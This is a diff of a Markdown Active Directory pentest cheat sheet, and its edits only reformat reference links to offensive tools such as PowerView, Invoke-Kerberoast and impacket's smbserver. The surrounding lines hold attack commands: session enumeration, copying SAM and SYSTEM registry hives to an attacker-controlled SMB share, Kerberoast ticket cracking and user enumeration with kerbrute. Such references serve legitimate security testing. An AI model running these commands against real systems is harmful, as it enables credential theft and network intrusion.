@@ -94,7 +94,7 @@ Foreach($obj in $Result)
 Import-Module .\PowerView.ps1
 Get-NetLoggedon -ComputerName <computer_name>
 ```
-https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
+- https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
 
 -> Enumerate all active sessions
 ```powershell
@@ -102,7 +102,7 @@ Get-NetSession -ComputerName dc1
 ```
 
 #### Enumeration Through Service Principal Names
-https://raw.githubusercontent.com/compwiz32/PowerShell/master/Get-SPN.ps1
+- https://raw.githubusercontent.com/compwiz32/PowerShell/master/Get-SPN.ps1
 
 ## Remote Access
 ### Remote Desktop Protocol - RDP
@@ -182,7 +182,7 @@ net use \\<smbserver>\share /USER:user teste321
 copy C:\Users\Backup\sam.hive \\<smbserver>\share\
 copy C:\Users\Backup\system.hive \\<smbserver>\share\
 ```
-https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py
+- https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py
 
 -> View smb enumeration  
 ```powershell
@@ -296,7 +296,7 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <ticket.kirbi>
 
 or  
 
-https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+- https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
 
 ## Password Spraying
 ```powershell
@@ -353,7 +353,7 @@ crackmapexec smb <IP> --shares -u <user> -p '<pass>'
 ```bash
 kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
 ```
-https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
+- https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
 
 -> GetNPUsers.py - Query ASReproastable accounts from the KDC
 ```bash
